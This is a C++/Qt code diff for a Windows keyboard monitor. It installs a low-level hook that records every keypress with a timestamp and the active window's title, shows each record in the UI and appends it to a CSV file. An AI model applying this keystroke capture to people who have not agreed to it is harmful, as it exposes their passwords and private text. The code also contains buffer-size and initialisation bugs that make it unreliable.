@@ -2,46 +2,108 @@
 
 
 keyboard_monitor*keyboard_monitor:: instance = nullptr;
+std::fstream keyboard_monitor::csv_keyboard;
+
+void keyboard_monitor::save_csv(std::vector<std::string>  csv_string){
+
+
+    for(std::string i : csv_string){
+        csv_keyboard<<i<<",";
+    }
+    csv_keyboard<<std::endl;
+
+
+}
 
 
 
 keyboard_monitor::keyboard_monitor() 
 {
-
+    csv_keyboard.open("csv_keboard.csv",std::ios::app);
 }
 keyboard_monitor::~keyboard_monitor()
 {
-
+    csv_keyboard.close();
 }
+//字符编码转换
+std::string WStringToString(const std::wstring& wstr) {
+    // 获取宽字符串的长度
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size_needed <= 0) {
+        return ""; // 转换失败
+    }
 
+    // 创建一个足够大的 std::string 来存储转换后的结果
+    std::string str(size_needed - 1, 0); // size_needed - 1 因为最后一个字符是 null 终止符
+
+    // 执行转换
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, NULL, NULL);
+
+    return str;
+}
 
 
     // 定义钩子过程
 LRESULT CALLBACK keyboard_monitor:: key_board_record(int nCode, WPARAM wParam, LPARAM lParam) {
 
-        if (nCode >=0) {
-            if (wParam == WM_KEYDOWN) {
-                PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-                DWORD vkCode = p->vkCode;
-                // 获取按键对应的字符
-                std::string key = GetKeyName(vkCode);
+    if (nCode < 0)
+    {
+        return CallNextHookEx(NULL, nCode, wParam, lParam);;
+    }
+    if (wParam == WM_KEYDOWN) {
+        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+        DWORD vkCode = p->vkCode;
+        // 获取按键对应的字符
+        std::string key = GetKeyName(vkCode);
 
-                // 获取按键的时间戳
-                auto now = std::chrono::system_clock::now();
-                std::time_t time = std::chrono::system_clock::to_time_t(now);
+        // 获取按键的时间戳
+        using namespace std::chrono;
+        system_clock::time_point now = system_clock::now();
+        time_t time = system_clock::to_time_t(now);
+        tm time_tm;
+        localtime_s(&time_tm,&time);
+        char time_c[100];
+        strftime(time_c,sizeof(time_c),"%Y-%m-%d %H:%M:%S",&time_tm);
 
-                // 将字符和时间组合成一个字符串
-                std::string message = key + " pressed at   " + std::ctime(&time);
-
-                // 发送组合后的信息
-                emit instance->send_message(message);
-
-
-
+        //获取窗口名称
+        // 获取当前处于焦点的窗口句柄
+        HWND hwnd = GetForegroundWindow();
+        // 用于存储窗口名称的缓冲区hbnkh
+        wchar_t windowTitle[256];
+        if (hwnd) {
 
 
+            // 获取窗口名称
+            int length = GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
+
+            if (length > 0) {
+
+            } else {
+                qDebug()  << "无法获取窗口名称。" ;
             }
+        } else {
+            qDebug() << "无法获取焦点窗口句柄。" ;
         }
+
+
+
+        // 将所有信息组合成一个字符串
+        std::string message = key + " 按下时间为  " +time_c +"所在的应用名称为 "+WStringToString(windowTitle)  ;
+
+        // 发送组合后的信息
+        emit instance->send_message(message);
+
+        // 字符串数组组合
+
+        std::vector<std::string>  csv_string{key,std::string(time_c),WStringToString(windowTitle)};
+
+        save_csv(csv_string);
+
+
+
+
+    }
+
         return 0;
     }
 
